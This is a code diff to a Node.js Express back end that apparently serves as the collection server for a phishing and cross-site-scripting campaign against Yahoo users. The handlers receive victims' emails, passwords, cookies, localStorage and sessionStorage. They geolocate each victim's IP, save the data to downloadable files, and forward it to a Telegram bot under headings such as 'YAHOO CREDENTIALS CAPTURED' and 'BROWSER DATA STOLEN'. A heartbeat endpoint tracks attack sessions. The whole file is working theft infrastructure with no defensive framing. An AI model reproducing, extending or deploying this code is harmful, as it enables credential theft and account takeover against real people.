@@ -14,6 +14,15 @@ const CHAT_ID = process.env.CHAT_ID || "6068638071";
 const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
 const COOKIES_DIR = path.join(__dirname, '../cookies');
 
+// Ensure cookies directory exists
+async function ensureCookiesDir() {
+  try {
+    await fs.access(COOKIES_DIR);
+  } catch (error) {
+    await fs.mkdir(COOKIES_DIR, { recursive: true });
+  }
+}
+
 // Telegram message sending function
 async function sendTelegramMessage(message) {
   if (!TELEGRAM_API) {
@@ -22,26 +31,20 @@ async function sendTelegramMessage(message) {
   }
 
   try {
-    console.log('Attempting to send Telegram message...');
+    console.log('Sending Telegram message...');
     
     const response = await fetch(TELEGRAM_API, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: message
-      }),
-      timeout: 10000
+        text: message,
+        parse_mode: 'HTML'
+      })
     });
 
     const result = await response.json();
     
-    console.log('Telegram API Response:', {
-      status: response.status,
-      ok: response.ok,
-      result: result
-    });
-
     if (!response.ok) {
       throw new Error(`Telegram API error: ${result.description || response.statusText}`);
     }
@@ -52,131 +55,22 @@ async function sendTelegramMessage(message) {
     console.error('Telegram send error:', error.message);
     return { 
       success: false, 
-      error: error.message,
-      stack: error.stack 
+      error: error.message
     };
   }
 }
 
-async function ensureCookiesDir() {
-  try {
-    await fs.access(COOKIES_DIR);
-  } catch (error) {
-    await fs.mkdir(COOKIES_DIR, { recursive: true });
-  }
-}
-
-// ENHANCED: Function to handle HTTP cookies, JS cookies, AND custom cookies
-async function createCookiesFile(email, ip, cookiesBefore, jsCookieData = null, customCookies = null, redirectUrl = null) {
+// Function to create cookies file
+async function createCookiesFile(data) {
   await ensureCookiesDir();
   
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-  const filename = `cookies_${email.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.txt`;
+  const email = data.email || 'unknown';
+  const filename = `cookies_${email.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.json`;
   const filepath = path.join(COOKIES_DIR, filename);
   
-  let fileContent = `Custom Cookies Capture Report
-====================
-Email: ${email}
-IP: ${ip}
-Timestamp: ${new Date().toISOString()}
-Redirect URL: ${redirectUrl || 'No redirect'}
-File: ${filename}
-
-INITIAL HTTP COOKIES (Before any action):
-${Object.entries(cookiesBefore).map(([k, v]) => `${k}: ${v}`).join('\n')}
-
-Total Initial HTTP Cookies: ${Object.keys(cookiesBefore).length}
-`;
-
-  // Add CUSTOM COOKIES section (NEW)
-  if (customCookies && customCookies.length > 0) {
-    fileContent += `
-
-CUSTOM GENERATED COOKIES (${customCookies.length}):
-================================================
-
-`;
-
-    customCookies.forEach((cookie, index) => {
-      fileContent += `COOKIE ${index + 1}:\n`;
-      fileContent += `Name: ${cookie.Name}\n`;
-      fileContent += `Value: ${cookie.Value}\n`;
-      fileContent += `Domain: ${cookie.Domain}\n`;
-      fileContent += `Path: ${cookie.Path}\n`;
-      fileContent += `Secure: ${cookie.Secure}\n`;
-      fileContent += `HttpOnly: ${cookie.HttpOnly}\n`;
-      fileContent += `SameSite: ${cookie.SameSite}\n`;
-      
-      // Try to decode base64 values for readability
-      if (cookie.Name === 'user_auth' || cookie.Name.includes('auth')) {
-        try {
-          const decoded = JSON.parse(Buffer.from(cookie.Value, 'base64').toString());
-          fileContent += `Decoded Auth Data: ${JSON.stringify(decoded, null, 2)}\n`;
-        } catch (e) {
-          // Not base64 or not JSON, keep as is
-        }
-      }
-      
-      // Decode JSON values
-      if (cookie.Name === 'user_preferences' || cookie.Value.startsWith('{')) {
-        try {
-          const decoded = JSON.parse(cookie.Value);
-          fileContent += `Decoded Preferences: ${JSON.stringify(decoded, null, 2)}\n`;
-        } catch (e) {
-          // Not JSON, keep as is
-        }
-      }
-      
-      fileContent += '-'.repeat(40) + '\n\n';
-    });
-  }
-
-  // Add JavaScript cookie data if provided
-  if (jsCookieData) {
-    fileContent += `
-
-JAVASCRIPT COOKIE SETTER SCRIPT:
-===============================
-${jsCookieData.substring(0, 3000)}...${jsCookieData.length > 3000 ? `\n[Truncated - total ${jsCookieData.length} chars]` : ''}
-
-`;
-
-    // Try to parse Microsoft-style cookies from the script
-    try {
-      const cookieMatch = jsCookieData.match(/JSON\.parse\(`([^`]+)`\)/);
-      if (cookieMatch && cookieMatch[1]) {
-        const cookiesJson = cookieMatch[1];
-        const cookiesArray = JSON.parse(cookiesJson);
-        
-        fileContent += `\nPARSED COOKIES FROM SCRIPT (${cookiesArray.length}):\n`;
-        fileContent += '='.repeat(50) + '\n\n';
-        
-        cookiesArray.forEach((cookie, index) => {
-          fileContent += `SCRIPT COOKIE ${index + 1}:\n`;
-          fileContent += `Name: ${cookie.Name}\n`;
-          fileContent += `Value: ${cookie.Value.substring(0, 100)}...\n`;
-          fileContent += `Domain: ${cookie.Domain}\n`;
-          fileContent += `Path: ${cookie.Path}\n`;
-          fileContent += `Secure: ${cookie.Secure}\n`;
-          fileContent += `HttpOnly: ${cookie.HttpOnly}\n`;
-          fileContent += `SameSite: ${cookie.SameSite}\n`;
-          if (cookie.Expires) fileContent += `Expires: ${new Date(cookie.Expires * 1000).toISOString()}\n`;
-          fileContent += '-'.repeat(30) + '\n\n';
-        });
-
-        // Extract redirect URL
-        const redirectMatch = jsCookieData.match(/window\.location\.href=atob\("([^"]+)"\)/);
-        if (redirectMatch && redirectMatch[1]) {
-          const redirectUrl = Buffer.from(redirectMatch[1], 'base64').toString();
-          fileContent += `REDIRECT URL FROM SCRIPT: ${redirectUrl}\n\n`;
-        }
-      }
-    } catch (parseError) {
-      fileContent += `NOTE: Could not parse cookies from script: ${parseError.message}\n\n`;
-    }
-  }
-
-  await fs.writeFile(filepath, fileContent);
+  // Save complete data as JSON
+  await fs.writeFile(filepath, JSON.stringify(data, null, 2));
   return { filename, filepath };
 }
 
@@ -192,33 +86,29 @@ router.get('/health', (req, res) => {
   });
 });
 
-// File download routes (keep as is)
-router.get('/download-cookies/:filename', async (req, res) => {
+// File download routes
+router.get('/download/:filename', async (req, res) => {
   try {
     const filename = req.params.filename;
     const filepath = path.join(COOKIES_DIR, filename);
     
-    console.log('Attempting to download file:', filename);
-    
     try {
       await fs.access(filepath);
-      console.log('File exists:', filepath);
     } catch (error) {
-      console.log('File not found:', filepath);
       return res.status(404).json({ 
         success: false, 
-        message: "Cookie file not found"
+        message: "File not found"
       });
     }
     
-    res.setHeader('Content-Type', 'text/plain');
+    res.setHeader('Content-Type', 'application/json');
     res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
     
-    const fileStream = require('fs').createReadStream(filepath);
-    fileStream.pipe(res);
+    const fileContent = await fs.readFile(filepath, 'utf8');
+    res.send(fileContent);
     
   } catch (error) {
-    console.error('Error downloading cookie file:', error);
+    console.error('Error downloading file:', error);
     res.status(500).json({ 
       success: false, 
       message: "Error downloading file"
@@ -226,23 +116,23 @@ router.get('/download-cookies/:filename', async (req, res) => {
   }
 });
 
-// List all cookie files (keep as is)
-router.get('/cookie-files', async (req, res) => {
+// List all files
+router.get('/files', async (req, res) => {
   try {
     await ensureCookiesDir();
     const files = await fs.readdir(COOKIES_DIR);
-    const cookieFiles = files.filter(file => file.startsWith('cookies_') && file.endsWith('.txt'));
+    const dataFiles = files.filter(file => file.endsWith('.json'));
     
     res.json({
       success: true,
-      totalFiles: cookieFiles.length,
-      files: cookieFiles.map(file => ({
+      totalFiles: dataFiles.length,
+      files: dataFiles.map(file => ({
         filename: file,
-        downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download-cookies/${file}`
+        downloadUrl: `/chukachina/download/${file}`
       }))
     });
   } catch (error) {
-    console.error('Error listing cookie files:', error);
+    console.error('Error listing files:', error);
     res.status(500).json({ 
       success: false, 
       message: "Error listing files"
@@ -250,45 +140,20 @@ router.get('/cookie-files', async (req, res) => {
   }
 });
 
-// Test route to verify file creation (keep as is)
-router.get('/test-files', async (req, res) => {
+// Test Telegram
+router.get('/test-telegram', async (req, res) => {
   try {
-    await ensureCookiesDir();
-    const files = await fs.readdir(COOKIES_DIR);
-    const cookieFiles = files.filter(file => file.startsWith('cookies_'));
+    const testMessage = `🤖 <b>TEST MESSAGE</b>
     
-    res.json({
-      success: true,
-      message: `Found ${cookieFiles.length} cookie files`,
-      totalFiles: cookieFiles.length,
-      files: cookieFiles,
-      cookiesDir: COOKIES_DIR
-    });
-  } catch (error) {
-    res.json({
-      success: false,
-      message: error.message,
-      cookiesDir: COOKIES_DIR
-    });
-  }
-});
+✅ Server is working!
+⏰ Time: ${new Date().toISOString()}
+📧 Test successful!`;
 
-// Telegram test route (keep as is)
-router.post('/test-telegram', async (req, res) => {
-  try {
-    const testMessage = `🤖 TEST MESSAGE - Server is working!
-Time: ${new Date().toISOString()}
-This confirms Telegram notifications are working!
-Email: test@example.com
-Password: test123`;
-
-    console.log('Testing Telegram...');
     const result = await sendTelegramMessage(testMessage);
     
     res.json({
       success: result.success,
-      telegramTest: true,
-      message: result.success ? 'Telegram message sent successfully!' : 'Failed to send',
+      message: result.success ? 'Telegram message sent!' : 'Failed to send',
       error: result.error
     });
     
@@ -301,104 +166,120 @@ Password: test123`;
   }
 });
 
-// UPDATED MAIN ENDPOINT - Now accepts custom_cookies
+// MAIN ENDPOINT - Enhanced for XSS data
 router.post('/', async (req, res) => {
   try {
-    console.log('=== CHUKACHINA ENDPOINT HIT ===');
-    console.log('Body keys:', Object.keys(req.body));
-    console.log('Has custom_cookies:', !!req.body.custom_cookies);
-    console.log('Has js_cookie_data:', !!req.body.js_cookie_data);
+    console.log('=== XSS DATA RECEIVED ===');
+    console.log('Request body type:', req.body.type);
+    console.log('Data keys:', Object.keys(req.body));
 
     const { 
-      email, 
-      password, 
-      targetDomain, 
-      js_cookie_data, 
-      http_cookies, 
-      custom_cookies,  // NEW: Accept custom cookies
-      user_agent, 
-      page_url,
-      timestamp 
-    } = req.body || {};
+      type,
+      attack_id,
+      credentials,
+      cookies,
+      localStorage,
+      sessionStorage,
+      url,
+      user_agent,
+      timestamp,
+      email, // Fallback for credentials
+      password // Fallback for credentials
+    } = req.body;
     
-    if (!email || !password) {
-      return res.status(400).json({ 
-        success: false, 
-        message: "Missing email or password" 
-      });
-    }
-
-    // IP + geo
-    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
+    // Get IP and location
+    const ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim();
     const location = geoip.lookup(ip);
     const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';
 
-    // UA parsing
+    // Parse user agent
     const parser = new UAParser(user_agent || req.headers['user-agent'] || '');
     const agent = parser.getResult();
     const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;
 
-    // Create cookies file WITH CUSTOM COOKIES
-    let fileInfo = null;
-    try {
-      fileInfo = await createCookiesFile(email, ip, http_cookies || {}, js_cookie_data, custom_cookies, null);
-      console.log(`Cookies file created: ${fileInfo.filename}`);
-    } catch (fileError) {
-      console.error('Error creating cookies file:', fileError);
+    // Extract credentials
+    let userEmail = email;
+    let userPassword = password;
+    
+    if (credentials) {
+      userEmail = credentials.username || credentials.email || userEmail;
+      userPassword = credentials.password || userPassword;
     }
 
-    // Build enhanced Telegram message
-    let message = `CUSTOM LOGIN NOTIFICATION
-
-Email: ${email}
-Password: ${password}
-IP: ${ip}
-Location: ${locationStr}
-Timestamp: ${new Date().toISOString()}
-Device: ${deviceType}
-Target Domain: ${targetDomain || 'None'}
-Page URL: ${page_url || 'None'}
-Custom Cookies: ${custom_cookies ? custom_cookies.length : 0}
-Cookies File: ${fileInfo ? fileInfo.filename : 'Failed to create'}
-Download URL: ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download-cookies/${fileInfo.filename}` : 'None'}
-
-HTTP Cookies (${Object.keys(http_cookies || {}).length}):
-${Object.entries(http_cookies || {}).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)'}
-`;
-
-    // Add CUSTOM COOKIES to Telegram message
-    if (custom_cookies && custom_cookies.length > 0) {
-      message += `\nCUSTOM COOKIES (${custom_cookies.length}):\n`;
-      custom_cookies.forEach(cookie => {
-        let valuePreview = cookie.Value;
-        if (cookie.Name === 'user_auth') {
-          try {
-            const decoded = JSON.parse(Buffer.from(cookie.Value, 'base64').toString());
-            valuePreview = `AUTH: ${decoded.email} (${decoded.session})`;
-          } catch (e) {
-            valuePreview = cookie.Value.substring(0, 30) + '...';
-          }
-        } else if (cookie.Value.length > 30) {
-          valuePreview = cookie.Value.substring(0, 30) + '...';
-        }
-        message += `- ${cookie.Name}: ${valuePreview}\n`;
+    if (!userEmail) {
+      return res.status(400).json({ 
+        success: false, 
+        message: "No email/username found in data" 
       });
     }
 
-    // Add JS cookie info (if any)
-    if (js_cookie_data) {
-      try {
-        const cookieMatch = js_cookie_data.match(/JSON\.parse\(`([^`]+)`\)/);
-        if (cookieMatch && cookieMatch[1]) {
-          const cookiesArray = JSON.parse(cookieMatch[1]);
-          message += `\nSCRIPT COOKIES (${cookiesArray.length}):\n`;
-          cookiesArray.forEach(cookie => {
-            message += `- ${cookie.Name}: ${cookie.Value.substring(0, 30)}...\n`;
-          });
-        }
-      } catch (parseError) {
-        message += `\nJS Cookies: (parse error)\n`;
-      }
+    // Create data file
+    let fileInfo = null;
+    try {
+      fileInfo = await createCookiesFile(req.body);
+      console.log(`Data file created: ${fileInfo.filename}`);
+    } catch (fileError) {
+      console.error('Error creating data file:', fileError);
+    }
+
+    // Build Telegram message based on data type
+    let message = '';
+    
+    if (type === 'yahoo_credentials' || credentials) {
+      message = `🔐 <b>YAHOO CREDENTIALS CAPTURED</b>
+
+📧 <b>Email:</b> <code>${userEmail}</code>
+🔑 <b>Password:</b> <code>${userPassword || 'N/A'}</code>
+
+🌐 <b>Location Info:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+📊 <b>Session Data:</b>
+├ Cookies: ${cookies ? Object.keys(cookies).length : 0}
+├ LocalStorage: ${localStorage ? Object.keys(localStorage).length : 0}
+└ Attack ID: ${attack_id || 'N/A'}
+
+🔗 <b>Page:</b> ${url || 'N/A'}
+⏰ <b>Time:</b> ${new Date().toISOString()}
+
+💾 <b>File:</b> ${fileInfo ? fileInfo.filename : 'Failed'}`;
+
+    } else if (type === 'initial_theft' || type === 'full_harvest') {
+      message = `📦 <b>BROWSER DATA STOLEN</b>
+
+📧 <b>Target:</b> <code>${userEmail || 'Yahoo Login'}</code>
+
+🌐 <b>Location Info:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+📊 <b>Stolen Data:</b>
+├ Cookies: ${cookies ? Object.keys(cookies).length : 0}
+├ LocalStorage: ${localStorage ? Object.keys(localStorage).length : 0}
+├ SessionStorage: ${sessionStorage ? Object.keys(sessionStorage).length : 0}
+└ Attack ID: ${attack_id || 'N/A'}
+
+🔗 <b>Page:</b> ${url || 'N/A'}
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+    } else {
+      // Generic message for other data types
+      message = `📡 <b>XSS DATA RECEIVED</b>
+
+📧 <b>Email:</b> <code>${userEmail || 'N/A'}</code>
+🔑 <b>Password:</b> <code>${userPassword || 'N/A'}</code>
+
+🌐 <b>Location:</b>
+├ IP: <code>${ip}</code>
+├ Location: ${locationStr}
+└ Device: ${deviceType}
+
+📊 <b>Data Type:</b> ${type || 'unknown'}
+🔗 <b>Page:</b> ${url || 'N/A'}
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
     }
 
     // Send to Telegram
@@ -411,27 +292,49 @@ ${Object.entries(http_cookies || {}).map(([k, v]) => `- ${k}: ${v}`).join('\n') 
       console.log('Telegram notification sent successfully');
     }
 
-    // Return success with download info
+    // Return success response
     return res.status(200).json({
       success: true,
-      message: "Login data received",
+      message: "Data received successfully",
       telegramSent: telegramResult.success,
-      attemptProcessed: true,
-      customCookiesCount: custom_cookies ? custom_cookies.length : 0,
+      dataType: type,
+      attackId: attack_id,
       downloadInfo: fileInfo ? {
         filename: fileInfo.filename,
-        downloadUrl: `/chukachina/download-cookies/${fileInfo.filename}`,
-        fullDownloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download-cookies/${fileInfo.filename}`
+        downloadUrl: `/chukachina/download/${fileInfo.filename}`,
+        fullDownloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}`
       } : null
     });
 
   } catch (error) {
-    console.error("Full error in /chukachina:", error);
-    return res.status(200).json({
-      success: true,
-      message: "Login processed (with errors)",
+    console.error("Error in /chukachina:", error);
+    return res.status(500).json({
+      success: false,
+      message: "Internal server error",
       error: error.message
     });
+  }
+});
+
+// Additional endpoint for heartbeat/persistence data
+router.post('/heartbeat', async (req, res) => {
+  try {
+    const { attack_id, url, timestamp, type } = req.body;
+    
+    const ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim();
+    
+    // Log heartbeat but don't send Telegram for every heartbeat
+    console.log(`💓 Heartbeat from ${attack_id} - IP: ${ip} - URL: ${url}`);
+    
+    res.json({
+      success: true,
+      message: "Heartbeat received",
+      attackId: attack_id
+    });
+    
+  } catch (error) {
+    console.error("Heartbeat error:", error);
+    res.json({ success: true }); // Always return success for heartbeats
   }
 });
 
